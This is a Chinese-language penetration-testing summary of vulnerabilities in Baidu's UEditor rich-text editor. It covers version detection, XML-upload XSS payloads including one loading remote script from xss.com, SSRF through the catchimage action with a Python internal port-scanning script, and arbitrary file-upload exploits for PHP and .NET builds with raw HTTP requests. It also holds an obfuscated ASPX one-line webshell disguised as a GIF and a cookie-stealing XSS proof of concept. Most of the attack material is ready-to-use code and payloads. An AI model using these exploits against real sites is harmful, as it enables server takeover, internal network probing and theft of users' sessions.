# UEditor漏洞总结
# 0x00 简介
Ueditor是由百度WEB前端研发部开发的所见即所得的开源富文本编辑器，具有轻量、可定制、用户体验优秀等特点，开源基于MIT协议，允许自由使用和修改代码，被广大WEB应用程序所使用。

# 0x01 版本识别
当存在demo界面时，可以尝试在控制台通过UE.version获得editor的版本
```
console.log(UE.version)
```
![image](https://user-images.githubusercontent.com/84888757/161830285-334e20f0-d595-4392-8157-752040adc37a.png)


# 0x02 xml文件上传 -> XSS
存在UEditor页面时，直接点击上传图片抓包；
没有demo页面时，自行构造上传表单，如下:
```
<html>
<head>
<meta charset="utf-8">
<title>菜鸟教程(runoob.com)</title>
</head>
<body>

<form action="http://xxxx.com/xxxaaa/ueditor/php/controller.php?action=uploadfile" method="post" enctype="multipart/form-data">
    <input id="File" name="Filedata" type="file" /> 
    <input type="submit" name="Button1" value="Button" id="Button1" />
</form>

</body>
</html>
```

将uploadimage类型改为uploadfile，并修改文件后缀名为xml，最后复制上xml代码即可。

![image](https://user-images.githubusercontent.com/84888757/161831678-66366daa-3cc1-4c3e-a7b7-c97704a7cd23.png)

然后在url中拼接xml路径，
```
http://xxxx.com\/xxxaaa\/upload\/file\/2022xx\/1xxxxxxxxxxxx9.xml
```

常用的上传路径：
```
/ueditor/index.html
/ueditor/asp/controller.asp?action=uploadimage
/ueditor/asp/controller.asp?action=uploadfile
/ueditor/net/controller.ashx?action=uploadimage
/ueditor/net/controller.ashx?action=uploadfile
/ueditor/php/controller.php?action=uploadfile
/ueditor/php/controller.php?action=uploadimage
/ueditor/jsp/controller.jsp?action=uploadfile
/ueditor/jsp/controller.jsp?action=uploadimage
```

常用的查看路径：
（请注意controller.xxx的访问路径）

```
/ueditor/net/controller.ashx?action=listfile
/ueditor/net/controller.ashx?action=listimage
```

**payload**整理成三类如下：

## 弹窗xss
```
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml"> alert(2022);
</something:script>
</body>
</html>
```
## url重置
```
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml"> window.location.href= "https://www.t00ls.net/" ;
</something:script>
</body>
</html>
```
## 远程加载JS
```
<html>
<head></head>
<body>
<something:script src="http://xss.com/xss.js" xmlns:something="http://www.w3.org/1999/xhtml">
</something:script>
</body>
</html>
```

# 0x03 SSRF
该漏洞存在于1.4.3的jsp版本中。但1.4.3.1版本已经修复了该漏洞。
已知该版本ueditor的ssrf触发点：
```
/jsp/controller.jsp?action=catchimage&source[]=
/jsp/getRemoteImage.jsp?upfile=
/php/controller.php?action=catchimage&source[]=
```
使用百度logo构造poc:
```
http://1.1.1.1:8080/xxx/ueditor/jsp/controller.jsp
?action=catchimage&source[]=
https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png
```
成功：

![image](https://user-images.githubusercontent.com/84888757/161593788-c6f8dd7d-dda1-4001-9f59-e00680a8a4fc.png)

![image](https://user-images.githubusercontent.com/84888757/161594141-34521f79-0001-4697-90dd-dc00d44a184b.png)

SSRF后续思路：

-  进行内网主机和端口探测。
-  访问开放的端口 -> 获取返回的一些特征 -> 识别在该服务器上部署的服务与应用。
-  针对性地采用一些payload去判断是否存在漏洞。

SSRF内网探测的脚本 @猎户攻防实验室
```
import sys
import json
import requests
from IPy import IP


def check(url, ip, port):
    url = '%s/jsp/controller.jsp?action=catchimage&source[]=http://%s:%s/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png' % (url, ip, port)
    res = requests.get(url)
    result = res.text
    result = result.replace("list","\"list\"")
    res_json = json.loads(result)
    state = res_json['list'][0]['state']
    if state == '远程连接出错'or state == 'SUCCESS':
        print(ip, port, 'is Open')
    else:
        print(ip, port, 'is Close')


def main(url, ip):
   ips = IP(ip)
   ports = [80,8080]
   for i in ips:
        for port in ports:
            check(url, i, port)


if __name__ == '__main__':
   url = sys.argv[1]
   ip = sys.argv[2]
   main(url, ip)
```
# 0x04 文件上传漏洞
## 4.1 PHP 版本的文件上传
```
POST /xxxxxx/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=ueditor/php/upload/fuck&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=fuck HTTP/1.1
Host: localhost
Connection: keep-alive
Content-Length: 222
Cache-Control: max-age=0
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/60.0.3112.78 Safari/537.36
Content-Type: multipart/form-data; boundary=——WebKitFormBoundaryDMmqvK6b3ncX4xxA
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4

———WebKitFormBoundaryDMmqvK6b3ncX4xxA
Content-Disposition: form-data; name="fuck"; filename="fuck.php"
Content-Type: application/octet-stream

<?php 
phpinfo();
?>
———WebKitFormBoundaryDMmqvK6b3ncX4xxA—

```

## 4.2 NET 版本的文件上传
该任意文件上传漏洞存在于1.4.3.3、1.5.0和1.3.6版本中，并且只有`.NET`版本受该漏洞影响。黑客可以利用该漏洞上传木马文件，执行命令控制服务器。
该漏洞是由于上传文件时，使用的CrawlerHandler类未对文件类型进行检验，导致了任意文件上传。1.4.3.3和1.5.0版本利用方式稍有不同，1.4.3.3需要一个能正确解析的域名。而1.5.0用IP和普通域名都可以。相对来说1.5.0版本更加容易触发此漏洞；而在1.4.3.3版本中攻击者需要提供一个正常的域名地址就可以绕过判断；

### 4.2.1 ueditor .1.5.0 .net版本
首先1.5.0版本进行测试，需要先在外网服务器上传一个图片木马，比如:1.jpg/1.gif/1.png都可以，下面x.x.x.x是外网服务器地址，source[]参数值改为图片木马地址，并在结尾加上“?.aspx”即可getshell，利用POC：
```
POST /ueditor/net/controller.ashx?action=catchimage
source%5B%5D=http%3A%2F%2Fx.x.x.x/1.gif?.aspx
```

### 4.2.2 ueditor.1.4.3.3 .net版
1、本地构造一个html，因为不是上传漏洞所以enctype 不需要指定为multipart/form-data， 之前见到有poc指定了这个值。完整的poc如下：
```
<html>
<head>
<meta charset="utf-8">
<title>菜鸟教程(runoob.com)</title>
</head>
<body>

<form action="http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage" enctype="application/x-www-form-urlencoded"  method="POST">
  <p>shell addr: <input type="text" name="source[]" /></p >
  <input type="submit" value="Submit" />
</form>

</body>
</html>
```

![image](https://user-images.githubusercontent.com/84888757/161834026-5493b7fa-1474-477d-b315-daee21a8c81e.png)

2、需准备一个图片🐎，远程shell地址需要指定扩展名为 1.gif?.aspx，1.gif图片🐎（一句话🐎：密码：hello）如下：
```
GIF89a
<script runat="server" language="JScript">
   function popup(str) {
       var q = "u";
       var w = "afe";
       var a = q + "ns" + w; var b= eval(str,a); return(b);
  }
</script>
<% popup(popup(System.Text.Encoding.GetEncoding(65001). GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJoZWxsbyJd")))); %>
```
成功后，会返回🐎的地址。

![image](https://user-images.githubusercontent.com/84888757/161834354-f54bc939-4532-433a-a496-f3f1f8680af3.png)

### 4.2.3 ueditor.1.3.6 .net1版本
使用%00截断的方式上传绕过

![image](https://user-images.githubusercontent.com/84888757/161834699-b4153aa1-69b9-44cc-8f4d-71d30e05f84c.png)
![image](https://user-images.githubusercontent.com/84888757/161834857-66a36738-1b8d-4b0c-94c9-0e7ae4caff28.png)
![image](https://user-images.githubusercontent.com/84888757/161834965-23df3566-4585-41ec-96e0-96d175ca8110.png)

# 0x05 XSS
该洞的触发点：
```
/php/getContent.php
/asp/getContent.asp
/jsp/getContent.jsp
/net/getContent.ashx

# poc
# myEditor中的’ E ’必须大写，小写无效。
post 数据包
myEditor=<script>alert(document.cookie)</script>
```

🌰 （图自：https://blog.csdn.net/yun2diao/）
![image](https://user-images.githubusercontent.com/84888757/161835447-ea4c967c-8502-4de7-be60-a58b591157e9.png)


# 参考链接
- [百度Ueditor编辑器漏洞总结 @潇湘信安](https://mp.weixin.qq.com/s/mH4GWTVoCel4KHva-I4Elw)
- [Ueditor最新版XML文件上传导致存储型XSS](https://blog.csdn.net/weixin_39693193/article/details/111257303)
- [记一次对ueditor的捡漏之旅 @pen4uin](https://mp.weixin.qq.com/s/LYPJ3KSbvwqZ3vEtQ_7flg)
- https://www.cesafe.com/html/4904.html
